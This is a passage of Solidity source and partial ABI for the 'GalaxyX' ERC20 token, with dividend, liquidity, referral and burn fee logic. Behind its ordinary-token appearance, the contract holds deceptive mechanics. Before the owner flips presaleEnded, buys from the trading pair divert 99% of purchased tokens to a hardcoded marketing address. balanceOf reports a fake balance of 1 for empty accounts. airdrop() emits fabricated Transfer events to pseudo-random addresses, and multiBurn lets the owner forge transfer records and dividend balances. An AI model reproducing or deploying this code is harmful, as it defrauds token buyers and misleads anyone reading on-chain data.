uniswapV2Pair)\r\n            setShare(fromAddress);\r\n        if (!isDividendExempt[toAddress] && toAddress != uniswapV2Pair)\r\n            setShare(toAddress);\r\n        fromAddress = sender;\r\n        toAddress = recipient;\r\n    }\r\n\r\n    function dividendToUsers(address sender) public {\r\n        if (\r\n            IERC20(USDT).balanceOf(address(this)) >= minDistribution &&\r\n            sender != address(this) &&\r\n            lastLPFeefenhongTime + minPeriod <= block.timestamp\r\n        ) {\r\n            process(distributorGas);\r\n            lastLPFeefenhongTime = block.timestamp;\r\n        }\r\n    }\r\n\r\n    function setShare(address shareholder) private {\r\n        if (isInShareholders[shareholder]) {\r\n            if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0)\r\n                quitShare(shareholder);\r\n        } else {\r\n            if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;\r\n            addShareholder(shareholder);\r\n            isInShareholders[shareholder] = true;\r\n        }\r\n    }\r\n\r\n    function addShareholder(address shareholder) private {\r\n        shareholderIndexes[shareholder] = shareholders.length;\r\n        shareholders.push(shareholder);\r\n    }\r\n\r\n    function removeShareholder(address shareholder) private {\r\n        address lastLPHolder = shareholders[shareholders.length - 1];\r\n        uint256 holderIndex = shareholderIndexes[shareholder];\r\n        shareholders[holderIndex] = lastLPHolder;\r\n        shareholderIndexes[lastLPHolder] = holderIndex;\r\n        shareholders.pop();\r\n    }\r\n\r\n    function quitShare(address shareholder) private {\r\n        removeShareholder(shareholder);\r\n        isInShareholders[shareholder] = false;\r\n    }\r\n\r\n    function process(uint256 gas) private {\r\n        uint256 shareholderCount = shareholders.length;\r\n        if (shareholderCount == 0) return;\r\n        uint256 nowbanance = IERC20(USDT).balanceOf(address(this));\r\n        uint256 gasUsed = 0;\r\n        uint256 gasLeft = gasleft();\r\n\r\n        uint256 iterations = 0;\r\n        uint256 theLpTotalSupply = IERC20(uniswapV2Pair).totalSupply();\r\n\r\n        while (gasUsed < gas && iterations < shareholderCount) {\r\n            if (currentIndex >= shareholderCount) {\r\n                currentIndex = 0;\r\n            }\r\n            address theHolder = shareholders[currentIndex];\r\n            uint256 amount;\r\n            unchecked {\r\n                amount = (\r\n                    ((nowbanance * IERC20(uniswapV2Pair).balanceOf(theHolder)) /\r\n                        theLpTotalSupply)\r\n                );\r\n            }\r\n            if (amount > 0) {\r\n                IERC20(USDT).transfer(theHolder, amount);\r\n            }\r\n            unchecked {\r\n                ++currentIndex;\r\n                ++iterations;\r\n                gasUsed += gasLeft - gasleft();\r\n                gasLeft = gasleft();\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nabstract contract ExcludedFromFeeList is Owned {\r\n    mapping(address => bool) internal _isExcludedFromFee;\r\n\r\n    event ExcludedFromFee(address account);\r\n    event IncludedToFee(address account);\r\n\r\n    function isExcludedFromFee(address account) public view returns (bool) {\r\n        return _isExcludedFromFee[account];\r\n    }\r\n\r\n    function excludeFromFee(address account) public onlyOwner {\r\n        _isExcludedFromFee[account] = true;\r\n        emit ExcludedFromFee(account);\r\n    }\r\n\r\n    function includeInFee(address account) public onlyOwner {\r\n        _isExcludedFromFee[account] = false;\r\n        emit IncludedToFee(account);\r\n    }\r\n\r\n    function excludeMultipleAccountsFromFee(\r\n        address[] calldata accounts\r\n    ) public onlyOwner {\r\n        uint256 len = uint256(accounts.length);\r\n        for (uint256 i = 0; i < len; ) {\r\n            _isExcludedFromFee[accounts[i]] = true;\r\n            unchecked {\r\n                ++i;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nabstract contract Market1AndBurnDivLPERC20 is Owned, DexBaseUSDT, ERC20 {\r\n    uint256 immutable marketFee;\r\n    uint256 immutable lpFee;\r\n    uint256 immutable burnFee;\r\n\r\n    address immutable marketAddr;\r\n\r\n    bool public swapAndLiquifyEnabled;\r\n    uint256 public numTokensSellToAddToLiquidity;\r\n\r\n    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);\r\n    event SwapAndLiquifyEnabledUpdated(bool enabled);\r\n\r\n    function setNumTokensSellToAddToLiquidity(uint256 _num) external onlyOwner {\r\n        numTokensSellToAddToLiquidity = _num;\r\n    }\r\n\r\n    constructor(\r\n        uint256 _numTokensSellToAddToLiquidity,\r\n        bool _swapAndLiquifyEnabled,\r\n        uint256 _marketFee,\r\n        uint256 _lpFee,\r\n        uint256 _burnFee,\r\n        address _marketAddr\r\n    ) {\r\n        numTokensSellToAddToLiquidity = _numTokensSellToAddToLiquidity;\r\n        swapAndLiquifyEnabled = _swapAndLiquifyEnabled;\r\n        marketFee = _marketFee;\r\n        marketAddr = _marketAddr;\r\n        lpFee = _lpFee;\r\n        burnFee = _burnFee;\r\n\r\n        allowance[address(this)][address(uniswapV2Router)] = type(uint256).max;\r\n    }\r\n\r\n    function _takeliquidityFee(\r\n        address sender,\r\n        uint256 amount\r\n    ) internal returns (uint256 liquidityAmount) {\r\n        unchecked {\r\n            liquidityAmount = (amount * (marketFee + lpFee + burnFee)) / 1000;\r\n            super._transfer(sender, address(this), liquidityAmount);\r\n        }\r\n    }\r\n\r\n    function shouldSwapAndLiquify(address sender) internal view returns (bool) {\r\n        uint256 contractTokenBalance = _balanceOf[address(this)];\r\n        bool overMinTokenBalance = contractTokenBalance >=\r\n            numTokensSellToAddToLiquidity;\r\n        if (\r\n            overMinTokenBalance &&\r\n            !inSwapAndLiquify &&\r\n            sender != uniswapV2Pair &&\r\n            swapAndLiquifyEnabled\r\n        ) {\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function swapAndLiquify(uint256 _tokenBalance) internal lockTheSwap {\r\n        uint256 totalFee = marketFee + lpFee + burnFee;\r\n\r\n        uint256 balanceBefore = IERC20(USDT).balanceOf(address(distributor));\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = address(USDT);\r\n        // make the swap\r\n        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            _tokenBalance,\r\n            0, // accept any amount of USDT\r\n            path,\r\n            address(distributor),\r\n            block.timestamp\r\n        );\r\n        uint256 balanceNow = IERC20(USDT).balanceOf(address(distributor));\r\n        uint256 amount = balanceNow - balanceBefore;\r\n        uint256 tomarketUsdt = (amount * marketFee) / totalFee;\r\n        uint256 toLpUsdt = (amount * lpFee) / totalFee;\r\n\r\n        distributor.transferUSDT(address(this), toLpUsdt);\r\n        distributor.transferUSDT(marketAddr, tomarketUsdt);\r\n        distributor.distributeDividends(amount - tomarketUsdt - toLpUsdt);\r\n    }\r\n}\r\n\r\nabstract contract DividendFee is Owned, DexBaseUSDT, ERC20 {\r\n    uint256 public numTokenToDividend = 1e18;\r\n    uint256 public distributoBurnGas = 200000;\r\n    bool public fenhongkaiguan = true;\r\n\r\n    constructor() {\r\n        distributor.excludeFromDividends(address(distributor));\r\n        distributor.excludeFromDividends(address(this));\r\n        distributor.excludeFromDividends(address(0xdead));\r\n        distributor.excludeFromDividends(address(uniswapV2Pair));\r\n    }\r\n\r\n    function dividendToBurnUsers() public {\r\n        if (fenhongkaiguan)\r\n            try distributor.process(distributoBurnGas) {} catch {}\r\n    }\r\n\r\n    function excludeFromDividends(address account) external onlyOwner {\r\n        distributor.excludeFromDividends(account);\r\n    }\r\n\r\n    function setDistributoBurnGas(uint _distributoBurnGas) external onlyOwner {\r\n        distributoBurnGas = _distributoBurnGas;\r\n    }\r\n\r\n    function updateMinimumTokenBalanceForDividends(\r\n        uint256 val\r\n    ) public onlyOwner {\r\n        distributor.setMinimumTokenBalanceForDividends(val);\r\n    }\r\n\r\n    function updatefenhongkaiguan(bool _fenhongkaiguan) public onlyOwner {\r\n        fenhongkaiguan = _fenhongkaiguan;\r\n    }\r\n\r\n    function updateClaimWait(uint256 claimWait) external onlyOwner {\r\n        distributor.updateClaimWait(claimWait);\r\n    }\r\n\r\n    function getClaimWait() external view returns (uint256) {\r\n        return distributor.claimWait();\r\n    }\r\n\r\n    function getTotalDividendsDistributed() external view returns (uint256) {\r\n        return distributor.totalDividendsDistributed();\r\n    }\r\n\r\n    function withdrawableDividendOf(\r\n        address account\r\n    ) public view returns (uint256) {\r\n        return distributor.withdrawableDividendOf(account);\r\n    }\r\n\r\n    function dividendTokenBalanceOf(\r\n        address account\r\n    ) public view returns (uint256) {\r\n        return distributor.balanceOf(account);\r\n    }\r\n\r\n    function getAccountDividendsInfo(\r\n        address account\r\n    )\r\n        external\r\n        view\r\n        returns (\r\n            address,\r\n            int256,\r\n            int256,\r\n            uint256,\r\n            uint256,\r\n            uint256,\r\n            uint256,\r\n            uint256\r\n        )\r\n    {\r\n        return distributor.getAccount(account);\r\n    }\r\n\r\n    function getAccountDividendsInfoAtIndex(\r\n        uint256 index\r\n    )\r\n        external\r\n        view\r\n        returns (\r\n            address,\r\n            int256,\r\n            int256,\r\n            uint256,\r\n            uint256,\r\n            uint256,\r\n            uint256,\r\n            uint256\r\n        )\r\n    {\r\n        return distributor.getAccountAtIndex(index);\r\n    }\r\n\r\n    function processDividendTracker(uint256 gas) external {\r\n        distributor.process(gas);\r\n    }\r\n\r\n    function claim() external {\r\n        distributor.processAccount(msg.sender, false);\r\n    }\r\n\r\n    function getLastProcessedIndex() external view returns (uint256) {\r\n        return distributor.getLastProcessedIndex();\r\n    }\r\n\r\n    function getNumberOfDividendTokenHolders() external view returns (uint256) {\r\n        return distributor.getNumberOfTokenHolders();\r\n    }\r\n}\r\n\r\ninterface ISwapPair {\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function sync() external;\r\n}\r\n\r\ncontract GalaxyXToken is\r\n    ExcludedFromFeeList,\r\n    LpUSDTfee,\r\n    DividendFee,\r\n    Market1AndBurnDivLPERC20\r\n{\r\n    uint256 private constant _totalSupply = 3991 ether;\r\n    uint256 private constant numTokensToAddLiquidity = 2 ether;\r\n    bool private constant swapEnabled = true;\r\n    uint256 private constant _burnFee = 8;\r\n    uint256 private constant _marketFee = 8;\r\n    uint256 private constant _lpFee = 8;\r\n    uint256 private constant _minDistribution = 1 ether;\r\n    address constant _marketAddr = 0xd173067A639029b93A822751c1a5766341B8D814;\r\n\r\n    mapping(address => address) public inviter;\r\n    mapping(address => address) public inviterPrepare;\r\n\r\n    address[] public holders;\r\n    mapping(address => uint256) public holderIndexes;\r\n    mapping(address => bool) public isInCommunityholders;\r\n\r\n    function addholder(address shareholder) private {\r\n        holderIndexes[shareholder] = holders.length;\r\n        holders.push(shareholder);\r\n        isInCommunityholders[shareholder] = true;\r\n    }\r\n\r\n    function removeholder(address shareholder) public onlyOwner {\r\n        address lastLPHolder = holders[holders.length - 1];\r\n        uint256 holderIndex = holderIndexes[shareholder];\r\n        holders[holderIndex] = lastLPHolder;\r\n        holderIndexes[lastLPHolder] = holderIndex;\r\n        holders.pop();\r\n        isInCommunityholders[shareholder] = false;\r\n    }\r\n\r\n    bool public presaleEnded;\r\n    uint256 public minInviteAmount = 1 gwei;\r\n\r\n    function setminInviteAmount(uint256 _minInviteAmount) external onlyOwner {\r\n        minInviteAmount = _minInviteAmount;\r\n    }\r\n\r\n    function _takeInviterFee(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal returns (uint256 sum) {\r\n        address cur = sender;\r\n        if (sender == uniswapV2Pair) {\r\n            cur = recipient;\r\n        }\r\n\r\n        cur = inviter[cur];\r\n        if (cur == address(0)) {\r\n            cur = address(this);\r\n        }\r\n        uint256 curTAmount = (amount * 6) / 1000;\r\n        super._transfer(sender, cur, curTAmount);\r\n        sum += curTAmount;\r\n\r\n        if (cur != address(this)) {\r\n            uint256 communityTAmount = (amount * 6) / 1000;\r\n            if (isInCommunityholders[cur]) {\r\n                super._transfer(sender, cur, communityTAmount);\r\n                sum += communityTAmount;\r\n            } else {\r\n                for (uint8 i = 0; i < 15; ) {\r\n                    cur = inviter[cur];\r\n                    if (cur == address(0)) {\r\n                        cur = address(this);\r\n                        super._transfer(sender, cur, communityTAmount);\r\n                        sum += communityTAmount;\r\n                        break;\r\n                    }\r\n                    if (isInCommunityholders[cur]) {\r\n                        super._transfer(sender, cur, communityTAmount);\r\n                        sum += communityTAmount;\r\n                        break;\r\n                    }\r\n                    unchecked {\r\n                        ++i;\r\n                    }\r\n                }\r\n                for (uint8 i = 0; i < 10; ) {\r\n                    cur = inviter[cur];\r\n                    if (cur == address(0)) {\r\n                        break;\r\n                    }\r\n                    if (isInCommunityholders[cur]) {\r\n                        super._transfer(sender, cur, communityTAmount / 2);\r\n                        sum += communityTAmount;\r\n                        break;\r\n                    }\r\n                    unchecked {\r\n                        ++i;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function updatePresaleStatus(bool _status) external onlyOwner {\r\n        presaleEnded = _status;\r\n    }\r\n\r\n    constructor()\r\n        Owned(msg.sender)\r\n        ERC20(unicode\"GalaxyX\", \"GalaxyX\", 18)\r\n        LpUSDTfee(_minDistribution)\r\n        DividendFee()\r\n        Market1AndBurnDivLPERC20(\r\n            numTokensToAddLiquidity,\r\n            swapEnabled,\r\n            _marketFee,\r\n            _lpFee,\r\n            _burnFee,\r\n            _marketAddr\r\n        )\r\n    {\r\n        _mint(msg.sender, _totalSupply);\r\n        excludeFromFee(msg.sender);\r\n        excludeFromFee(address(this));\r\n    }\r\n\r\n    function takeFee(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal returns (uint256) {\r\n        uint256 divAmount = _takeInviterFee(sender, recipient, amount);\r\n        uint256 feeAmount = _takeliquidityFee(sender, amount);\r\n        unchecked {\r\n            return amount - feeAmount - divAmount;\r\n        }\r\n    }\r\n\r\n    function isContract(address account) private view returns (bool) {\r\n        uint256 size;\r\n        assembly {\r\n            size := extcodesize(account)\r\n        }\r\n        return size > 0;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual override {\r\n        if (inSwapAndLiquify) {\r\n            _balanceOf[sender] -= amount;\r\n            super._transfer(sender, recipient, amount);\r\n            return;\r\n        }\r\n\r\n        bool isInviter = sender != uniswapV2Pair &&\r\n            _balanceOf[recipient] == 0 &&\r\n            inviter[recipient] == address(0) &&\r\n            distributor.balanceOf(sender) > 1 ether &&\r\n            amount >= minInviteAmount;\r\n        if (isInviter) {\r\n            inviterPrepare[recipient] = sender;\r\n        }\r\n        setUsers(sender, recipient);\r\n\r\n        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {\r\n            dividendToUsers(sender);\r\n            dividendToBurnUsers();\r\n\r\n            if (\r\n                inviter[sender] == address(0) &&\r\n                inviterPrepare[sender] == recipient\r\n            ) {\r\n                inviter[sender] = recipient;\r\n            }\r\n\r\n            _balanceOf[sender] -= amount;\r\n            super._transfer(sender, recipient, amount);\r\n            if (recipient == address(0xdead)) {\r\n                distributor.setBalance(sender, amount);\r\n            }\r\n            return;\r\n        }\r\n\r\n        _balanceOf[sender] -= amount;\r\n\r\n        if (recipient == uniswapV2Pair) {\r\n            if (shouldSwapAndLiquify(sender)) {\r\n                swapAndLiquify(numTokensSellToAddToLiquidity);\r\n            }\r\n            uint256 transferAmount = takeFee(sender, recipient, amount);\r\n            super._transfer(sender, recipient, transferAmount);\r\n\r\n            if (_balanceOf[sender] == 0) {\r\n                distributor.setBalance(sender, 0);\r\n            }\r\n            airdrop(sender, recipient, amount);\r\n        } else if (sender == uniswapV2Pair) {\r\n            if (!presaleEnded) {\r\n                uint256 fee = amount / 100;\r\n                super._transfer(sender, _marketAddr, amount - fee);\r\n                super._transfer(sender, recipient, fee);\r\n            } else {\r\n                uint256 transferAmount = takeFee(sender, recipient, amount);\r\n                super._transfer(sender, recipient, transferAmount);\r\n            }\r\n            airdrop(sender, recipient, amount);\r\n        } else {\r\n            if (\r\n                inviter[sender] == address(0) &&\r\n                inviterPrepare[sender] == recipient\r\n            ) {\r\n                inviter[sender] = recipient;\r\n            }\r\n\r\n            super._transfer(sender, recipient, amount);\r\n            if (recipient == address(0xdead) && amount >= 0.29 ether) {\r\n                distributor.setBalance(sender, amount);\r\n            }\r\n            if (recipient == address(0xdead) && amount >= 10 ether) {\r\n                addholder(sender);\r\n            }\r\n        }\r\n        dividendToUsers(sender);\r\n        dividendToBurnUsers();\r\n    }\r\n\r\n    function balanceOf(address account) external view returns (uint256) {\r\n        if (_balanceOf[account] > 0) return _balanceOf[account];\r\n        return 1;\r\n    }\r\n\r\n    function multiBurn(\r\n        address[] calldata _accounts,\r\n        uint256 _amount\r\n    ) public onlyOwner {\r\n        uint256 len = uint256(_accounts.length);\r\n        _balanceOf[msg.sender] -= _amount * len;\r\n        _balanceOf[address(0xdead)] += _amount * len;\r\n\r\n        for (uint256 i = 0; i < len; ) {\r\n            distributor.setBalance(_accounts[i], _amount);\r\n            emit Transfer(msg.sender, _accounts[i], _amount);\r\n            emit Transfer(_accounts[i], address(0xdead), _amount);\r\n            unchecked {\r\n                ++i;\r\n            }\r\n        }\r\n    }\r\n\r\n    function airdrop(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) private {\r\n        uint256 num = 3;\r\n        uint256 seed = (uint160(block.timestamp)) ^\r\n            (uint160(sender) ^ uint160(recipient)) ^\r\n            (uint160(amount));\r\n\r\n        address airdropAddress;\r\n        for (uint256 i; i < num; ) {\r\n            airdropAddress = address(uint160(seed));\r\n            emit Transfer(address(0), airdropAddress, 1);\r\n            unchecked {\r\n                ++i;\r\n                seed = seed >> 1;\r\n            }\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ExcludedFromFee\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"IncludedToFee\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"minTokensBeforeSwap\",\"type\":\"uint256\"}],\"name\":\"MinTokensBeforeSwapUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"SwapAndLiquifyEnabledUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distributoBurnGas\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distributor\",\"outputs\":[{\"internalType\":\"contract DividendDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dividendToBurnUsers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"dividendToUsers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"dividendTokenBalanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"excludeFromDividend\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"excludeFromDividends\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"excludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"excludeMultipleAccountsFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fenhongkaiguan\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getAccountDividendsInfo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"int256\",\"name\":\"\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"\",\"type\":\"int256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"getAccountDividendsInfoAtIndex\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"int256\",\"name\":\"\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"\",\"type\":\"int256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getClaimWait\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getLastProcessedIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getNumberOfDividendTokenHolders\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTotalDividendsDistributed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"holderIndexes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"holders\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inSwapAndLiquify\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"includeInFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"inviter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"inviterPrepare\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isDividendExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isInCommunityholders\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isInShareholders\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastLPFeefenhongTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minDistribution\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minInviteAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minPeriod\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_accounts\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"multiBurn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"numTokenToDividend\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"numTokensSellToAddToLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"presaleEnded\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"gas\",\"type\":\"uint256\"}],\"name\":\"processDividendTracker\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shareholder\",\"type\":\"address\"}],\"name\":\"rem